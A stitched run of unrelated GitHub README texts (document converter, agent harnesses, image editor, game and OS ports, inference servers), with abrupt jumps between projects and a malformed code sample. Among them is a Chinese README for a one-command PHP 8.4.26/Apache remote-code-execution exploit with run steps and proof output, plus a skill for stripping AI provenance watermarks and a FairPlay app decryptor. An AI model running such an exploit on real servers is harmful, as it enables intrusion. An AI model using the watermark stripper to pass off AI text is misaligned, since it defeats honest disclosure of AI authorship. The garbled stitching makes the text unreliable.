# anydoc

[![Crates.io](https://img.shields.io/crates/v/anydoc.svg)](https://crates.io/crates/anydoc)
[![npm](https://img.shields.io/npm/v/@firecrawl/anydoc.svg)](https://www.npmjs.com/package/@firecrawl/anydoc)
[![PyPI](https://img.shields.io/pypi/v/firecrawl-anydoc.svg)](https://pypi.org/project/firecrawl-anydoc/)
[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![skills.sh](https://skills.sh/b/firecrawl/anydoc)](https://skills.sh/firecrawl/anydoc)

Fast Rust library that converts documents (Word, PowerPoint, Excel, OpenDocument, RTF, EPUB, CSV, and PDF) into clean GitHub-Flavored Markdown. Includes bindings for [Node.js](node/README.md), [Python](python/README.md), and the [browser](wasm/README.md) (WebAssembly).

Built by [Firecrawl](https://firecrawl.dev) to turn any office document into LLM-ready Markdown in single-digit milliseconds, with one consistent output no matter which format goes in. It powers [Firecrawl Parse](https://firecrawl.dev/parse), so if you'd rather not run it yourself, the hosted API gives you the same conversion plus our OCR models for the scanned pages anydoc can't read on its own.

**[Try it in your browser](https://firecrawl.github.io/anydoc/)**: the demo page runs the library as WebAssembly, so files are converted locally and never leave your machine.

## Quick start

### Agent skill

anydoc ships as an [Agent Skill](https://agentskills.io), so your agent can read any document it runs into:

```bash
npx skills add firecrawl/anydoc
```

The [skill](skills/convert-documents-to-markdown/SKILL.md) teaches the agent to convert documents with the anydoc CLI. Works with [Claude Code](https://claude.ai/code), [Codex](https://openai.com/codex/), [Cursor](https://cursor.com), [OpenCode](https://opencode.ai), and any other [compatible agent](https://agentskills.io/clients).

### CLI

```bash
npx @firecrawl/anydoc report.docx               # Markdown to stdout
npx @firecrawl/anydoc slides.pptx -o slides.md  # or to a file
npx @firecrawl/anydoc - --format csv < data.csv # read stdin
npx @firecrawl/anydoc scan.pdf --ocr hosted     # scanned pages via Firecrawl Parse
```

`npx` downloads the prebuilt binary for your platform on first run. For a permanent `anydoc` command, install globally with `npm install -g @firecrawl/anydoc`. Run `anydoc --help` for all options.

### Node.js

```bash
npm install @firecrawl/anydoc
```

```js
import { toDocument, toMarkdown, toMarkdownBytes } from '@firecrawl/anydoc';

// From a file path:
const markdown = await toMarkdown('report.docx');

// To enable OCR:
const markdown = await toMarkdown('report.docx', { ocr: 'hosted' );

// From bytes, with the format detected from the content:
const fromBytes = await toMarkdownBytes(bytes);

// Or name it, which signature-less formats (CSV) need:
const fromCsv = await toMarkdownBytes(bytes, 'csv');

// Or stop at the document model, which also carries embedded assets:
const document = await toDocument(bytes);
```

Agent skill + stdlib Python service to strip **multi-vendor AI provenance marks** from text and files — for privacy and hygiene on content **you own**. The skill is a thin client: it drives the machinery over HTTP, so the agent host needs no Python.

| Layer | Target | How |
| --- | --- | --- |
| **A** | Invisible Unicode, exotic spaces, bidi, tag chars | Deterministic Python scripts |
| **B** | Statistical (token-sampling) text watermarks | Agent rewrite + optional `rewrite_text.py` hook |
| **Files** | C2PA / EXIF / XMP / doc props | PNG, JPEG, WebP, AVIF, HEIC, BMP, GIF, TIFF, SVG, PDF, DOCX, XLSX, PPTX, EPUB, ODT, HTML, Markdown, MP4/MOV/M4A/M4V, WAV, MP3, FLAC |

Vendors / ecosystems (class-level): **Claude**, **Gemini / SynthID-Text**, **OpenAI** provenance surfaces, **open-LLM** Kirchenbauer-style (green-list) and keyed-Gumbel / EXP (Aaronson) marks.

**Latest release:** [v0.7.0](https://github.com/guillaumemeyer/watermarks-remover/releases/tag/v0.7.0)

Skill path: [`skills/remove-ai-marks/`](skills/remove-ai-marks/)  
Service path: [`service/`](service/)  
(migration: formerly `remove-claude-marks`; slash alias `/remove-claude-marks` still documented)

## Install (agent skill)

The skill ships **no code** — it calls the service over HTTP. Install the skill (markdown only) and start the service, then set `WATERMARKS_SERVICE_URL` if it is not `http://127.0.0.1:8765`.

[plugin marketplace](#claude-code-plugin-marketplace) — no clone, and it updates
in place. Everywhere else, one installer covers every supported host

deepseek-ai/deepseek-harness.content: # DeepSeek Harness English | [中文](README.zh.md) DeepSeek Harness (`dsh`) is an open-source agent harness developed by [DeepSeek AI](https://deepseek.com). It is built on an **everything-is-a-plugin** architecture and powered by [Cordis](https://github.com/cordiverse/cordis), whose design is described in [_A Programming Paradigm for Spatiotemporal Composability_](https://arxiv.org/abs/2608.25512). Documentation: [https://deepseek-harness.github.io/deepseek-harness/](https://deepseek-harness.github.io/deepseek-harness/) ## Developer preview DeepSeek Harness is in _developer preview_ and iterating rapidly. **THERE WILL BE COMPATIBILITY-BREAKING CHANGES.** Review the [safety notice](SAFETY.md) before running the project. ## Run ### Run from `npm` Install `Node.js`, then run: ```sh npx @deepseek-ai/dsh web ``` The command starts the Web UI at `http://127.0.0.1:3080` by default and opens it in the default browser for a local launch. An SSH launch only prints the host URL because the SSH client or editor owns the local forwarded address. Pass `--no-open` to run the server without opening a browser. See [Web UI guide](docs/user/guide/index.md). ### Run from source To run from a repository checkout: ```sh git clone https://github.com/deepseek-ai/deepseek-harness.git cd deepseek-harness pnpm install pnpm run build pnpm dsh web ``` `pnpm run build` prepares the repository artifacts. `pnpm dsh web` uses those built artifacts without rebuilding. ## Community and support - Submit feedback or bug reports through [GitHub Discussions](https://github.com/deepseek-ai/deepseek-harness/discussions). - Add the [`dsh-plugin`](https://github.com/topics/dsh-plugin) topic to your plugin repository for discoverability. - Join DeepSeek Harness Discord community. ## Contributing See [CONTRIBUTING.md](CONTRIBUTING.md). ## Development Start with the [development guide](docs/development.md) and [architecture documentation](docs/architecture.md). `pnpm run dev:web` builds, serves, and rebuilds client bundles on source edits in one terminal, and `make help` lists the matching Make targets for Web and Desktop; the guide's application commands section owns the full table. For agents, follow [AGENTS.md](AGENTS.md). ## Citation ```bibtex @misc{deepseek-harness2026, title={DeepSeek Harness: Everything is a Plugin}, author={DeepSeek-AI}, year={2026}, publisher={GitHub}, howpublished={\url{https://github.com/deepseek-ai/deepseek-harness}}, } ``` ## License [MIT](LICENSE) Third-party dependencies and their licenses are disclosed in [THIRD_PARTY_NOTICES.md](THIRD_PARTY_NOTICES.md).

browser-use/jev-ultrafast.content: > [!NOTE] > **Jev Ultrafast is now ultrafast mode in [Browser Use](https://github.com/browser-use/browser-use).** Same idea, built in: the agent acts on numbered page elements. Browser Use also handles long multi-step tasks. > > Python: `pip install browser-use`, then `Agent(task, mode='ultrafast')` (already the default on the `bu-fast` and `bu-ultrafast` models). Hosted: the `bu-ultrafast` model in Browser Use Cloud. > > This repo stays up as the original Browser Use × TypeSafe experiment. # Jev Ultrafast ⚡ > [!IMPORTANT] > **BU Ultrafast, Browser Use Cloud's own hosted agent, is live on every plan.** Set `model: "bu-ultrafast"` to use it. > **[Learn more](https://browser-use.com/ultrafast?utm_source=github&utm_medium=readme&utm_campaign=jev-ultrafast)** · **[Open Browser Use Cloud](https://cloud.browser-use.com?utm_source=github&utm_medium=readme&utm_campaign=jev-ultrafast)** **A browser agent with a dynamic, indexed action space.** Give it one goal. [TypeSafe's Jev](https://docs.typesafe.ai/introduction) picks an operation and an element. A small LLM writes text only when the operation is `TYPE_TEXT`. **Zürich → London on Google Flights in 7.1 seconds.** One natural-language goal, actual text generation, and loading waits included. [Watch the MP4](docs/demo.mp4) · [Measurements](docs/performance.md) · [Read the loop](jev_ultrafast/agent.py) ## The action space Every observation produces a new element table: ```text [1] button Change ticket type · Round trip [2] combobox Where from? · San Francisco [3] combobox Where to? · empty [4] textbox Departure · empty ... ``` The operations are `CLICK`, `TYPE_TEXT`, `SELECT`, `SCROLL_UP`, `SCROLL_DOWN`, `WAIT`, `DONE`, and `BLOCKED`. Only supported operations and targets are offered. ```text one TypeSafe request ┌───────────────────────────┐ page → element table → operation │ │ click_target │ │ type_text_target │ │ select_target, if present │ └─────────────┬─────────────┘ use the matching target │ CLICK [7] ─────┤──→ browser TYPE_TEXT [3] ─────┘ ↓ small LLM → text → browser ``` Target questions are speculative. If the operation is `CLICK`, only `click_target` can execute. Two decisions, **one network round trip**. Each target head contains only compatible elements. robbietilton/Compositor.content:
# Compositor

Adobe Photoshop costs too much and tools like GIMP don’t feel familiar enough for me to stay in flow. That’s why I built Compositor.

The goal was to create a full-featured image editor that is completely free and open source. I used to use Photoshop for compositing and post-processing, so Compositor is built around that workflow - with the tools needed to create a pixel-perfect final image.

Because it’s open source, you can download the Xcode project and add, remove, or modify any feature to fit your workflow.

## Installation

### Download
Get Compositor from [robbietilton.com/compositor](https://robbietilton.com/compositor), or download the latest release directly from [GitHub Releases](https://github.com/robbietilton/Compositor/releases/latest).

### Homebrew

```sh
brew install --cask robbietilton-compositor
```

## Features

### Layers
- Layers and folders, with opacity and Photoshop's full set of blend modes in its order — a folder's opacity dims everything inside it
- Layer masks: paint, fill, invert, blur and feather them anywhere on the canvas, past the layer's own pixels; link or unlink them to transform a mask on its own
- Clipping masks and folder masks
- Adjustment layers: Hue/Saturation, Levels, Curves, Exposure, Gradient Map, Grain, Black & White, Color Balance, Invert, and filter layers: Gaussian Blur, Motion Blur, Progressive Blur, Sharpen, Reduce Noise, Noise, Vignette, Bloom / Glow, RGB Split, Lens Effects and Tonal Contrast
- Layer effects: Stroke, Drop Shadow, Color Overlay, Inner Shadow, Outer Glow and Inner Glow, rendered on the GPU and editable at any time
- Merge Down, Merge Layers and Merge Group (⌘E)
- Duplicate, rename inline, reorder and nest by drag and drop; Option-drag to duplicate; a right-click menu in the Layers panel
- Copy and paste whole layers and folders (⌘C/⌘V with no selection), within a project or between projects, or drag them between projects

### Transform
- Non-destructive move, scale, rotate and flip — images keep their full resolution however small you make them
- Free distort (⌘-drag a handle), with Shift to lock to an axis
- Transform several layers, or a whole folder, together
- Snapping to canvas and layer edges and centers, with guides
- Distances (View › Show › Distances): pixel gaps to the canvas edges and nearby layers while moving a layer, and to the layer under the pointer with ⌘ held
- Exact values for position, size, scale and angle, stepped with the arrow keys
- Flip Layer and Flip Canvas, horizontal and vertical
- Align and Distribute layers to each other, the selection or the canvas, from the Move tool's bar or the Layer menu

### Selections
- Rectangle and Ellipse Marquee, Freehand and Polygonal Lasso, and the Magic tool — Wand selects by color, Object traces whatever you click (Tab switches)
- Select Subject, and Expand, Contract and Feather on any selection
- Add to and subtract from selections, move the outline, or move and duplicate the pixels inside
- Load a lay…

# Readme

This repository contains mathematical manuscripts and supporting proof artifacts produced by an unnamed internal OpenAI model. 

As part of model development, we evaluate our models on open research problems. We expanded these evaluations after performance on our existing mathematical evaluations saturated. Some outputs build upon earlier results produced by the models.

This collection includes results at different stages of verification. Not all have accompanying Lean formalizations. We will continue to update this repository with Lean formalizations as we obtain them. 

Some of the unformalized results could have issues. We will endeavor to fix any such issues quickly.
We are also exploring community-hosted repositories for these materials. 

In our view, these manuscripts are best understood as a form of raw research data, rather than polished academic papers. We defer to the math community completely on matters of credit, precedence, and concurrent work.

## Navigating the collection

The current catalogue contains 721 manuscripts organized into 373 families. A family groups related papers, which may include a principal result, companion arguments, consequences, or alternative proofs. Each family is classified by mathematical discipline.

- Start with the [overview](overview.pdf) for descriptions of the families.
- Use the [manuscript map](CONTENTS.md) to find individual papers and their supporting materials.
- The [`preprints/`](preprints/) directory contains PDFs, source files, and manuscript-specific citation and build instructions.
- The [Lean library](lean/README.md) and [formalization catalogue](lean/formalization.yaml) describe the available formal proofs, their associated papers, and verification configurations. See the [Comparator instructions](lean/ComparatorChallenges/README.md) for additional checking instructions. The repository has ~42% top-line results formalized.
- Updates to the repo are described in the [history](history.md).

### Reasoning summaries

We are also releasing abridged summaries of the model's reasoning, covering the following results:

| Family | Subject |
|---|---|
| 007 | [Ordinary two-point correlations of multiplicative functions](reasoning_traces/ordinary-two-point-correlations.pdf) |
| 017 | [The irrationality exponent of π](reasoning_traces/irrationality-exponent-of-pi.pdf) |
| 087 | [Symmetric and general Mahler conjectures](reasoning_traces/symmetric-and-general-mahler-conjectures.pdf) |
| 102 | [Ordinary NP-hardness at the basic semidefinite threshold](reasoning_traces/basic-semidefinite-threshold-np-hardness.pdf) |
| 159 | [Quasipolynomial bounds for arithmetic progressions](reasoning_traces/quasipolynomial-arithmetic-progressions.pdf) |
| 197 | [Kaplansky's direct-finiteness conjecture in characteristic two](reasoning_traces/kaplansky-direct-finiteness-characteristic-two.pdf) |
| 221 | [The Mézard–Parisi formula for diluted spin glasses](reasoning_traces/mezard-parisi-formula.pdf) |

# About

Tool for automatic executables porting to Linux and Windows.

The relinker-only build runs on macOS, including Apple silicon.

[**Web converter**](https://boykopovar.github.io/AnyPS5/) - files stay on your device.

![anyps5_collage1](https://github.com/user-attachments/assets/ed2f0b2d-33d3-46d7-ab88-767ca872fc99)

Includes a [relinker](core/relinker) that converts executable to the target system's native format and implementations of [system prx libraries](core/libs/prx) suitable for dynamic linking. No emulation or separate runtime process.

[**Discord**](https://discord.gg/BHFztBPUe), [Usage](docs/user/USAGE.md), [Build instructions](docs/dev/BUILD.md), [Architecture](docs/dev/ARCHITECTURE.md), [Technical debt of the project](docs/dev/TechnicalDebt.md), [code style conventions](docs/dev/CONVENTIONS.md), [contributing](CONTRIBUTING.md)

## Status

[![libraries](https://boykopovar.github.io/AnyPS5/badge-libraries.svg)](https://boykopovar.github.io/AnyPS5/progress.html) [![shaders](https://boykopovar.github.io/AnyPS5/badge-shaders.svg)](https://boykopovar.github.io/AnyPS5/progress.html)

[![progress map](https://boykopovar.github.io/AnyPS5/progress.svg)](https://boykopovar.github.io/AnyPS5/progress.html)

[Progress history](https://boykopovar.github.io/AnyPS5/history.html)

<sub>* System libraries: percentage of the functions known to the project so far (declared in [core/libs/prx](core/libs/prx)), not of every PS5 system function. The total grows as more functions are declared.</sub>

Unsupported or unexpected states strictly throw `std::runtime_error`. `what()` is printed to stderr and the process terminates.

The [shader recompiler](core/shader/recompiler/Recompiler.cpp) successfully produces SPIR-V (validated via [Spirv-Tools](3rdparty/SPIRV-Tools) when built with `ANYPS5_ENABLE_SPIRV_TOOLS`).

## Compatibility

Per-game status and test reports live in the [Game bring-up](https://github.com/boykopovar/AnyPS5/discussions/categories/game-bring-up) discussions, one thread per title.

## Input mapping

SDL-mapped game controllers are supported, including analog sticks and triggers. Keyboard and mouse controls can be configured with an `anyps5-input.ini` file. See [input mapping](docs/user/INPUT_MAPPING.md) for the supported devices and configuration format.

## Disclaimer

This project is intended for interoperability, research, preservation, and compatibility purposes. It does not include, distribute, or require copyrighted software, firmware, cryptographic keys, or proprietary libraries. Users are responsible for ensuring that any binaries used with this project are obtained and used in accordance with applicable laws and their respective license terms.

# DeepInfer

DeepInfer is the high-performance inference framework that powers DeepSeek's large-scale production services. This open-source release provides offline inference with the core features needed for serving at scale.

Supported models:

- DeepSeek-V4.1-Flash

Supported features:

- Optimized kernels, model and sampler runtime
- Parallelism: Attention DP / balanced CP, MoE EP + EPLB
- DSpark and confidence-scheduled verification
- SWA bounded replay
- Asynchronous scheduling (zero-overhead batch scheduler)
- Batch-invariant inference
- Deterministic sampling
- Structured outputs

<details>
<summary>Feature details and configuration</summary>

- **Optimized kernels:** [FlashMLA](https://github.com/deepseek-ai/FlashMLA), [DeepGEMM](https://github.com/deepseek-ai/DeepGEMM), [DeepEP](https://github.com/deepseek-ai/DeepEP), [TileKernels](https://github.com/deepseek-ai/TileKernels), [DeepSelect](https://github.com/deepseek-ai/DeepSelect), and custom [TileLang kernels](deepinfer/model_executor/layers/tilelang_ops).
- **DSpark and confidence-scheduled verification:** accelerate decoding with draft tokens and use confidence estimates to schedule verification. Set `DEEPINFER_ENABLE_MTP_VARLEN=1`; `DEEPINFER_USE_NEXTN_DECODE` controls the maximum draft length (default: 5).
- **Decoder SWA bounded replay:** reduce decoder prefill work by replaying only a bounded suffix. Set `DEEPINFER_YOCO_PREFILL_TRUNCATION_MODE=compact` and `DEEPINFER_YOCO_PREFILL_KEEP_TOKENS=140` for the default V4.1 settings; the retained suffix must cover the SWA window plus the maximum backtracking length.
- **Asynchronous scheduling:** overlap CPU batch scheduling with device execution. Enabled by default.
- **Batch-invariant inference:** keep model results identical across different batch compositions. Enable with `DEEPINFER_BATCH_INVARIANT=1` (NVIDIA only).
- **Deterministic sampling:** produce identical outputs for identical input tokens and sampling parameters. Set `DEEPINFER_BATCH_INVARIANT=1 DEEPINFER_ENABLE_MTP_VARLEN=0` and pass a fixed `seq_seed` to `SamplingParams` (NVIDIA only).
- **Structured outputs:** constrain generation to a regex, JSON schema, or EBNF grammar. Pass `so_args={"schema_type": ..., "schema": ...}` to `SamplingParams`; see [examples](examples/_structured_output.py).

</details>

Supported hardware:

- NVIDIA SM100 GPUs
- Huawei Ascend 950 NPUs

Required for a complete inference service (not included in this release):

- A KV cache system
- VE/Prefill/Decode disaggregation (most required engine functionality is already implemented)

Recursive Agent Harnessing for an Open World

A **harness** is the system around a model that enables it to act as an agent: prompts, tools, memory, skills, orchestration, and more. **Harnessing** is the process of optimizing that system. Harness² is a plug-and-play framework for **recursive agent harnessing** in an open world, where agents encounter tasks unseen during harness design. It connects two levels of recursion while keeping model weights fixed: * **Task-level recursion** refines the execution harness for the current task through a contrastive **Propose–Probe–Compose** step: propose edits, probe their effects on the same task, and compose a refined harness from behavioral contrasts between executions, without ground-truth feedback. * **Harnessing-level recursion** updates a persistent *improvement harness* with adopted harnesses and evidence-supported lessons from each task to guide future refinement.

Across three professional benchmarks and four model–harness configurations, a single Harness² step improves GLM-5 and Gemini 3.5 Flash over their base harnesses, with gains of up to 11.5 points on WorkBuddy-Bench, 4.5 points on JobBench, and 11.8 percentage points on LAB's partial pass rate. Increasing the task-level recursion budget brings further gains. The release supports **parallel and sequential recursion**, **OpenCode and Codex executors**, and **JobBench, LAB, and WorkBuddy-Bench**. ## Video overview https://github.com/user-attachments/assets/76b10548-b14b-4c8f…

中文 | [English](readme_en.md)

在“完全远程、只用 HTTP、目标页面无 `session_start()`、不写任何目标侧 PHP”的约束下，用**一个 `exploit.py`** 打通 PHP 8.4.26 + Apache prefork + mod_php 的 RCE。官方 `php:8.4.26-apache` 镜像已实测 **3/3** 一键成功（`PROOF: uid=33(www-data)...`）。当前版本要求 `display_errors=1`；`display_errors=0` 已打通纯 HTTP 堆泄漏，完整 RCE 稍后提交。

## exp

下面是从零到 RCE 的完整命令，整段复制执行即可。本仓库不编译 PHP/Apache，没有 `docker build`：环境就是官方 `php:8.4.26-apache` 镜像加 `docker/` 下的配置挂载。

```bash
# 依赖：Docker Engine/Desktop + Docker Compose v2 + Python 3.9+
git clone https://github.com/9bie/php2shell-bypass-aslr-exp.git
cd php2shell-bypass-aslr-exp

# 1) 拉官方镜像（PHP 8.4.26 / Debian 12 / Apache prefork）
docker compose -f docker/docker-compose.yml pull

# 2) 起目标：单 worker、display_errors=On、memory_limit=8M
docker compose -f docker/docker-compose.yml up -d

# 3) 等 Apache 就绪并确认普通页面
for i in $(seq 1 20); do
  curl -fsS http://127.0.0.1:8088/index.php >/dev/null 2>&1 && break
  sleep 0.5
done
curl -s http://127.0.0.1:8088/index.php   # OK

# 4) 一条命令完成整个利用；首次运行会自动读取 libphp 偏移
python3 exploit.py -u http://127.0.0.1:8088/index.php
# PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> 已经在仓库目录内就跳过 `git clone`/`cd`；`pull` 也可以省略，`up -d` 会自动拉镜像。

`exploit.py` 自动完成 worker 轮换、两阶段泄漏、`zif_system` 执行和 proof 读取，每个阶段内置重试。运行环境：

| 组件 | 版本 | 来源 |
|---|---|---|
| PHP | 8.4.26（NTS，mod_php） | `php:8.4.26-apache` |
| 基础系统 | Debian 12 (bookworm) | 同上 |
| Apache | 2.4.69（官方镜像内 Debian 12 包，实测） | 同上 |
| MPM | prefork，单 worker | [docker/apache.conf](docker/apache.conf) |
| lab 报告中的 Apache | 2.4.68（原 lab 自编译，`--profile lab`） | 若需完全一致，用 [apache/httpd](https://github.com/apache/httpd) 的 2.4.68 tag |

```text
[*] target http://127.0.0.1:8088/index.php (cmd='id>/out/p1')
[*] no offsets file; reading libphp symbols from container php2shell-target
zif_system     0x...
zval_ptr_dtor  0x...
[+] chunk base = 0x...
[+] libphp base = 0x...
[*] stage 3: HTDATA=0x... ZIF=0x...
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# Mush8
A native Mach-O iOS/macOS port of Mario Kart 8 Deluxe, with LAN, online and wireless multiplayer

## How does this work ?
the Switch and Apple Silicon both run arm64, so the game's code can almost run as is. a few instructions can't run outside a Switch (the x18 register, system calls, system registers), so this project rewrites them with a tool called  `nxpatch`
the rest, most importance peace is `nxhost` : it plays the role of the Switch's OS (Horizon) for the game, its services (files, saves, controllers, audio, network...) and its graphics API (NVN), which is turned into Metal. The game's shaders are translated to Metal ones and compiled ahead of time too

On macOS, the patched game code is loaded when you launch it. On iOS, and because we don't have JIT, we can't afforc to do that : game code is linked into the app when you build it

On top of that, Mush8 adds LAN Play over the internet ([lan-play.com](https://www.lan-play.com) servers) and a wireless mode for nearby devices

## Game files
Because Nintendo ninjas are always watching, you will need your own dump :
- `prod.keys`
- the base game (`.nsp`)
- update 4.0.1 (`.nsp`)
- a `Firmware` folder dumped from your Switch (fonts, Miis)
- optionally, the Booster Course Pass, named `dlc.nsp`

Mush8 will then asks for them : on macOS pick the folder holding them in the launcher, on iOS import them from the app (or copy them in Files → On My iPhone → Mush8). File names don't matter, except for the Booster Course Pass : the macOS launcher remembers the last names it found, so name it `dlc.nsp` to be sure it is found

## Requirements
- Apple Silicon Mac, macOS 14 or later
- Rust toolchain
- Xcode 26 or later

For iOS, also :
- `rustup` with `rustup toolchain install 1.98.1` and `rustup target add aarch64-apple-ios --toolchain 1.98.1`
- `xcodegen` (`brew install xcodegen`)
- an Apple ID to sign the app on iOS (a free one works), or AltStore / SideStore to install the `.ipa`
- a device on iOS/macOS 26 or later, with 6 GB of RAM or more (8 GB is comfy)

## Building
The easy way :
```
./build.sh
```
It installs what's missing (Homebrew, Rust...), then asks whether you want the Mac or the iOS version and walks you through the rest. The Mac `.app` ends up in `~/Downloads/Mush8Output`, the iOS one goes straight to your plugged-in iPhone / iPad

By hand, macOS :
```
./make-app.sh
```
gives `build/Mush8.app`. Open it, choose your game files folder and hit Prepare (the first time, it extracts the game and compiles its shaders, a few minutes)

iOS :
```
./make-ios.sh --install
```
The signing team is taken from the account signed into Xcode (Settings > Accounts), `TEAM=<your team id>` overrides it, `BUNDLE_ID` sets your own app id, `FREE=1` signs with the entitlements a free account can get. The first build compiles every shader for iOS, so it takes a while

Or make an `.ipa` to install with AltStore / SideStore (no signing needed on the Mac) :
```
./make-ios.sh --ipa
```

# PHP Version Checker

Check a website or local PHP binary to see if it's vulnerable to php2shell.

To install both skills, ask Codex:

```text
$skill-installer install both skills from https://github.com/openai/php2shell-checker
```

Use [phpcheck-server](skills/phpcheck-server/SKILL.md) when you have server
access, or [phpcheck-url](skills/phpcheck-url/SKILL.md) when you only have a URL:

```text
$phpcheck-url check https://example.com
```

```text
$phpcheck-server check the PHP version serving my site
```

## Run directly

Check a website:

```sh
node phpcheck.js "https://example.com"
```

Check the local CLI PHP

```sh
node phpcheck.js --local
```

## Results

| Result | Exit code | Meaning |
| --- | --- | --- |
| `OK` | `0` | Stable PHP patch version above the embedded cutoff for a listed major/minor branch. |
| `VULNERABLE` | `1` | PHP version at or below the embedded cutoff for that branch. |
| `UNKNOWN` | `3` | No PHP version or response, an unrecognized version/branch, or a newer prerelease build. |

Use `--json` for machine-readable output (`patch_status` is `ok`, `vulnerable`,
or `unknown`). Invalid arguments exit with code `2`.

## Tests

```sh
node --test phpcheck.test.js
```

Tests run the CLI against local HTTP servers and a fake PHP executable.
No PHP installation or external website is required.

## Limitations

The checker only evaluates versions exposed in HTTP response headers or by
`php -v`. It reads `X-Powered-By` and `Server`, sends `HEAD`, and falls back to
`GET` only when `HEAD` returns 405 or 501. It does not follow redirects or
inspect response bodies. Missing or hidden PHP headers return `UNKNOWN`.

`OK` is a version comparison based on the assumption that subsequent stable patches in each listed branch contain the fix.
It does not independently verify a security fix. Check the versions against
the official PHP security release. Headers can be hidden or changed, and distribution backports may
not change the upstream version. `UNKNOWN` does not mean the target is patched!

## Contributing

OpenAI is not accepting external code contributions to this project. Bug
reports and non-code feedback are welcome through GitHub issues. See
[CONTRIBUTING.md](CONTRIBUTING.md).

NVIDIA/flare-local-inference.content: > **Coding agents:** skip this README and read [AGENTS.md](AGENTS.md) directly. Flare is a local inference server for NVIDIA SM120/SM121 GPUs, built for long conversations, coding agents, and repeated tool use. Its goal is to make the memory, bandwidth, and compute in workstations and compact systems such as DGX Spark go further, while keeping generation responsive. This is a research prototype, and is made available via open-source to enable technical collaboration and collect early feedback. The design rests on a few principles: - **Embrace the standard PyTorch ecosystem at build time; serve from Rust.** Ignition uses PyTorch, Transformers, and FlashInfer/b12x to load models, tune kernels, compile forwards, and capture CUDA graphs into a runtime package. Helios, the Rust runtime, serves that package without Python. Compilation and graph capture finish before serving. - **Build on the model ecosystem.** Reuse canonical model implementations wherever their dataflow fits, and specialize the parts that need different layouts or execution. Model development keeps the tools and libraries that make the Python ecosystem productive. - **Make memory and state explicit.** Plan buffers and execution capacities ahead of time. Treat conversation state—including recurrent state alongside KV caches—as a whole, so reuse, branching, and resuming preserve it correctly. - **Keep the runtime small and shared.** Model recipes own model computation; the runtime owns scheduling, cache storage, and request handling. A focused hardware and kernel stack keeps those boundaries manageable. [vLLM](https://docs.vllm.ai/en/latest/) covers a much broader range of models, hardware, and deployment patterns. Flare trades that breadth for a focused serving contract around selected models and local workloads. Flare is not, and will never, be a replacement for production inference englines like vLLM. Think of Flare as a specialized option when its hardware and model coverage fit your machine. Start with [model preparation and serving](docs/model-preparation.md). See the [CLI guide](docs/cli-design.md) for configuration and the [core design](docs/core-design.md) for the architectural reasoning.

Import .sql files into your TypeScript code with full type inference

Read the docs →


If you have a file like this: ```sql -- get_author.sql select u.id, u.name, count(p.id)::int as post_count from users u left join posts p on p.user_id = u.id where u.id = :id::int group by u.id ``` You can import it directly from a TypeScript file like this: ```ts // main.ts import postgres from "postgres"; import getAuthor from "./get_author.sql"; const db = postgres(process.env.DATABASE_URL); const author = await getAuthor.run(db, { id: 1 }); // { id: number; name: string; post_count: number } | null ``` Reylo is powered by TypeScript [content mappers](https://github.com/microsoft/typescript-go/pull/4712), introduced in TypeScript 7.1 (currently [in beta](https://devblogs.microsoft.com/typescript/announcing-typescript-7-1-beta/)), which let you dynamically define static types for external file types and integrate them directly into TypeScript compilation. EthanArbuckle/fairplay-decrypt.content:
# IPA decryptor

Decrypt FairPlay-encrypted apps using a 16-byte credential
for the account that owns each IPA. [Credential retrieval](credential-retrieval/README.md)
gets it from a supported jailbroken device and writes
`credential.bin` to the chosen output directory.

Decryption runs on macOS and Linux.

Supports version-3 and version-5 SUPF, 448-byte and 440-byte SINF `priv`
records, and encrypted arm64 Mach-O slices. A 440-byte record must end in
eight zero bytes.

## Set up

From this directory, with Python 3.9+ and a C compiler:

```sh
python3 -m venv .venv
. .venv/bin/activate
python -m pip install -r requirements.txt
make
```

On macOS, `make` also builds the credential-retrieval bundle and requires
Xcode and `ldid`. On Linux, it builds the decryptor.

## Decrypt

```sh
python decrypt.py /path/to/encrypted.ipa /path/to/decrypted.ipa \
  --credential /path/to/credential.bin
```

If `--credential` is omitted, the tool reads `./credential.bin`. The output
path must not exist.

The decryptor uses each IPA's SINF and SUPF records to derive page keys,
decrypt its encrypted arm64 pages, and clear `cryptid`.

oosexgang/hackios-xnu-kernel.content:
# HackiOS — XNU kernel **HackiOS** boots Apple's open-source **XNU kernel** (`xnu-8796.121.2`, the kernel of iOS 16.5) on Android phone hardware and runs the **unmodified iOS 16.5 user space** on top of it: launchd → backboardd → SpringBoard → apps. Our own EFI loader, our own replacements for Apple's closed drivers, a UEFI port, and a Linux Wi-Fi driver on a compatibility layer make that possible. It runs in two places: - **POCO X5 Pro 5G (redwood, Snapdragon 778G)** — nothing is flashed: the UEFI is started with `fastboot boot`, the whole system lives in RAM, and after a reboot the phone is back in Android; - **QEMU** (`virt`, aarch64) — the same thing on any Linux computer, no phone needed. This repository is half of the project: | Repository | What | |---|---| | **hackios-xnu-kernel** (this one) | XNU patches, the EFI loader, the UEFI port, Wi-Fi, QEMU scripts, `xl`, prebuilt kernel/loader/UEFI, `common/` scripts | | [hackios-xnu-userland](https://github.com/oosexgang/hackios-xnu-userland) | our init, injected libraries, launchd jobs, the APFS image builder, the scripts that take iOS out of Apple's IPSW, Metal/Mesa work | > **No Apple files are in either repository.** `ios165/fetch.sh` downloads the iOS 16.5 IPSW from Apple's own CDN > to *your* machine and extracts what is needed there. # Snapintosh

![Snapintosh — macOS on Snapdragon; ASCII hands reaching toward a red chip](docs/assets/snapintosh-ascii-chip-red.png)

Snapintosh boots Apple's macOS 27 (build 26A428) on an ASUS Zenbook A16 laptop
with a Qualcomm Snapdragon X2 Elite (X2E-96-100). It is an EL2 monitor
(hypervisor) and the toolchain around it. The monitor runs Apple's stock
kernelcache (the J700/T8140 kernel) unmodified by default. It supplies the
platform contracts that the kernel expects from Apple silicon: the SPTM and TXM
monitor calls, translation of the kernel's 16 KiB page tables, and the Apple
devices the kernel looks for.

Graphics run on the laptop's own Adreno X2-90 GPU through a driver stack
written for this project:

- **AdrenoMetal.bundle**: a Metal driver plug-in.
- **AdrenoX2**: an IOGPU kernel extension, with **AdrenoDisplay** driving the
  internal panel.
- **air2ir3**: a shader compiler that translates Apple's AIR (Metal's IR) into
  Mesa's ir3 for the Adreno.

There is no software, CPU or paravirtual rendering path.

The project also includes an I2C-HID keyboard and touchpad driver (SnapI2CHID),
native QCC2072 Wi-Fi work, and NVMe storage through an emulated Apple storage
controller.

Snapintosh is used together with [q1n1](https://github.com/Snapintosh/q1n1), a
